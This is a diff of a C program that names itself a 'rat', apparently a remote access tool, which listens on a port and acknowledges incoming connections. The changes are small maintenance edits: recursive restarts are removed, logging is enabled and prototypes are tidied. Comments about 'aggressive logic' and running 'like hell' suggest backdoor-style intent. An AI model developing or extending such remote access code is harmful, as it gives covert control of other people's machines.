@@ -3,13 +3,13 @@
 #include <string.h>
 #include <clog/clog.h> //logging library
 #include <net_util.h> //networking library
-#include <crypt/crypt.h>
+//#include <crypt/crypt.h>
 /**
     #Just for reference
     int connect_server(char * hostname, int port); //connects to server
     int start_server(int port); //starts server in its place
-    int writeln(int sockfd, char *msg, int len); //writes to connection
-    char *readln(int sockfd); //reads from connection
+    int writeln(int sockfd, const char *msg, int len); //writes to connection
+    const char *readln(int sockfd); //reads from connection
     **/
 
 #define SECRET_MSG "bla"
@@ -125,11 +125,11 @@ void process(const char* msg, int soc)
 int start_rat(int port)
 {
     int soc = start_server(port);
-    char* msg = (char*)malloc(BUFFER_SIZE);
+    //char* msg = (char*)malloc(BUFFER_SIZE);
     if (soc == -1) {
         //TODO add aggressive logic rather than giving up
         fprintf(stderr, "Cannot start rat\n");
-        return start_rat(port); //TODO control stack overflow
+        return -1; //start_rat(port); //TODO control stack overflow
     }
     clog_i(DAEMON, "Starting server...");
     /*while(1) */
@@ -141,8 +141,8 @@ int start_rat(int port)
             clog_i(DAEMON, "Sending ACK");
             writeln(soc, CONNECT_ACK, strlen(CONNECT_ACK));
         }
-        else
-            return start_rat(port); //FIXME use seperate process or threads(controlled)
+        //else
+         //   return start_rat(port); //FIXME use seperate process or threads(controlled)
     }
     //write to client or if it fails run like hell
     while (1) {
@@ -154,6 +154,7 @@ int start_rat(int port)
 
 int main(int argc, char* argv[])
 {
+    clog_enable();
     if (argc < 2) {
         fprintf(stderr, "Usage: rat [HOST] PORT\n");
         return -1;
